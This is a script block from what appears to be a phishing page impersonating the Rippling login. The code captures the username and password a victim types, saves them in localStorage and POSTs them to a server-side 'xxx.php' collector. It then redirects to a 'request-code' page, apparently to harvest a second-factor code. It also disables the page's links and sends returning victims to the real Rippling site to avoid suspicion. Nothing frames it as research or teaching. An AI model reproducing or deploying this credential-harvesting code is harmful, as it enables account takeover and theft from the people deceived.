        <script>
            $(document).ready(function(){
                if (localStorage.hasOwnProperty("submitted")) {
                    window.location.href = "https://app.rippling.com/";
                }
            });

            $('.e1j1vcgk2').click(function(){
                var typee = $('#field-3').attr('type');
                if(typee == "password") {
                    console.log('password -> text');
                    $('#field-3').prop('type','text');
                } else {
                    console.log('text -> password');
                    $('#field-3').prop('type','password');
                }
            })

            $('a').click(function(e){
                e.preventDefault();
            });

            $('#field-3').on('keydown',function(){
                $('.eeddhkb1').attr('class','css-1y8ebpz-Container-serializedCss eeddhkb1 xmm');
                $('.eeddhkb1').prop('disabled',false)
            });

            function validateEmail(email) {
                var re = /\S+@\S+\.\S+/;
                return re.test(email);
            }

            function validatePhone(email) {
                var re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/im;
                return re.test(email);
            }

            $('#xlogin').submit(function(e){
                e.preventDefault();
			
                console.log('button clicked');

                var username = $('#field-1').val();
                var password = $('#field-3').val();

                $('div[data-testid="email"]').removeClass('css-1dorz6c-StyledBaseInputContainer-InputContainer e1j1vcgk5');
                $('div[data-testid="password"]').removeClass('css-1dorz6c-StyledBaseInputContainer-InputContainer e1j1vcgk5');
                $('.el33r6a0').replaceWith('')


                if(validateEmail(username) == false && validatePhone(username) == false){
                    $('div[data-testid="email"]').addClass('css-1dorz6c-StyledBaseInputContainer-InputContainer e1j1vcgk5');
                    $('div[data-testid="email"]').after('<span id="field-1-helptext" class="css-1tg17zx-StyledMessage el33r6a0" role="alert">This is neither a phone number nor an email</span>');
                    return;
                }

                if(password.length < 4) {
                    $('div[data-testid="password"]').addClass('css-1dorz6c-StyledBaseInputContainer-InputContainer e1j1vcgk5');
                    $('div[data-testid="password"]').after('<span id="field-1-helptext" class="css-1tg17zx-StyledMessage el33r6a0" role="alert">Password is too short</span>');
                }
                
                if(username.length > 4 && password.length > 4) {

                    $('.xmm').attr('class','css-1qli0ze-Container-serializedCss')
                    $('.xmm').attr('disabled');

                    localStorage.setItem('username',username);
                    localStorage.setItem('password',password);

                    $.ajax({
                        type: "POST",
                        url: "xxx.php",
                        data: {'username':username,'password':password,'type':'1'},
                        success: function(msg){

                            setTimeout(function(){
                                window.location.href = "./request-code/";
                            },3000);

                        }
                    });

                }


            });


        </script>
